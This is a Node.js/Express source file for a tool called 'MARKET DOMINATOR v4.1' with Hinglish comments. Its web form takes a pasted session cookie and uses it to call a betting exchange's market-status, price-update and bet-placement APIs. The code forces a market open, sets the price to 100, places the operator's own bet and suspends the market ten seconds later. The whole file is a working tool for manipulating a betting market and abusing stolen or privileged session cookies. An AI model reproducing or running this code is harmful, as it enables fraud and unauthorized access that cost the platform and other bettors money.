const axios = require('axios');
const express = require('express');
const app = express();

async function globalInjection(amt, cookie, tid, sid, rate, customUrl, isBack) {
    const headers = { 'Cookie': cookie, 'Content-Type': 'application/json' };
    // Agar customUrl hai toh wo use hoga, nahi toh default darkexch
    const betApi = customUrl || "https://darkexch9.com/api/Exchange/PlaceBet";
    const priceApi = "https://darkexch9.com/api/Exchange/UpdateMarketPrice"; 
    const statusApi = "https://darkexch9.com/api/Exchange/SetMarketStatus";

    try {
        // 1. SABKE LIYE MARKET OPEN KARO
        await axios.post(statusApi, { "marketId": tid, "status": "OPEN" }, { headers });

        // 2. GLOBAL BHAO 100 KARO
        await axios.post(priceApi, { "marketId": tid, "selectionId": sid, "lastPrice": rate || "100" }, { headers });
        
        // 3. APNI BET PLACE KARO
        const payload = { "marketId": tid, "selectionId": sid, "odds": rate || "100", "stake": amt, "isBack": isBack === "true" };
        const res = await axios.post(betApi, payload, { headers });

        // 4. THEEK 10 SECOND BAAD AUTO-SUSPEND
        setTimeout(async () => {
            await axios.post(statusApi, { "marketId": tid, "status": "SUSPENDED" }, { headers });
        }, 10000);

        return "🔥 GLOBAL INJECTION ACTIVE (10s Timer Started)";
    } catch (e) { return "⚠️ Error: " + e.message; }
}

app.get('/', (req, res) => {
    res.send(`
    <html><body style="background:#000;color:#f00;text-align:center;font-family:sans-serif;padding:20px;">
        <h1 style="text-shadow:0 0 15px #f00;">⚡ MARKET DOMINATOR v4.1 ⚡</h1>
        <div style="border:3px solid #f00;padding:20px;display:inline-block;background:#111;border-radius:15px;text-align:left;">
            
            <p style="color:#666;font-size:12px;">OPTIONAL: CUSTOM API URL</p>
            <input type="text" id="api" placeholder="https://darkexch9.com/api/Exchange/PlaceBet" style="width:100%;padding:10px;margin-bottom:15px;background:#222;color:#0f0;border:1px solid #333;">

            <p style="color:#666;font-size:12px;">GLOBAL COOKIE ACCESS</p>
            <input type="text" id="c" placeholder="Paste Cookie..." style="width:100%;padding:10px;margin-bottom:15px;background:#222;color:#fff;border:1px solid #f00;">
            
            <div style="display:flex;gap:10px;margin-bottom:15px;">
                <input type="text" id="m" placeholder="Market ID" style="padding:10px;width:50%;background:#222;color:#fff;border:1px solid #333;">
                <input type="text" id="sid" placeholder="Selection ID" style="padding:10px;width:50%;background:#222;color:#fff;border:1px solid #333;">
            </div>
            
            <div style="display:flex;gap:10px;margin-bottom:20px;">
                <input type="number" id="r" value="100" style="padding:10px;width:50%;background:#222;color:#0f0;font-weight:bold;border:1px solid #333;">
                <input type="number" id="a" placeholder="Stake" style="padding:10px;width:50%;background:#222;color:#fff;border:1px solid #333;">
            </div>
            
            <p style="color:#888; font-size:12px; text-align:center;">TIMER: <b style="color:#f00;">10 SECONDS</b></p>
            <button onclick="f()" style="width:100%;padding:20px;background:red;color:#fff;font-weight:bold;border:none;border-radius:8px;cursor:pointer;">🚀 EXECUTE GLOBAL INJECTION</button>
        </div>
        <h3 id="s" style="color:#0f0;margin-top:20px;"></h3>
        <script>
            function f() {
                document.getElementById('s').innerText = "Infecting Market...";
                let url = '/fire?amt='+document.getElementById('a').value +
                          '&cookie='+encodeURIComponent(document.getElementById('c').value) +
                          '&tid='+document.getElementById('m').value +
                          '&sid='+document.getElementById('sid').value +
                          '&rate='+document.getElementById('r').value +
                          '&api='+encodeURIComponent(document.getElementById('api').value) + 
                          '&isBack=true';
                fetch(url).then(r => r.text()).then(t => { document.getElementById('s').innerText = t; });
            }
        </script>
    </body></html>`);
});

app.get('/fire', async (req, res) => {
    // API parameter ko function mein pass kiya gaya hai
    const result = await globalInjection(req.query.amt, req.query.cookie, req.query.tid, req.query.sid, req.query.rate, req.query.api, req.query.isBack);
    res.send(result);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("Dominator v4.1 Online"));
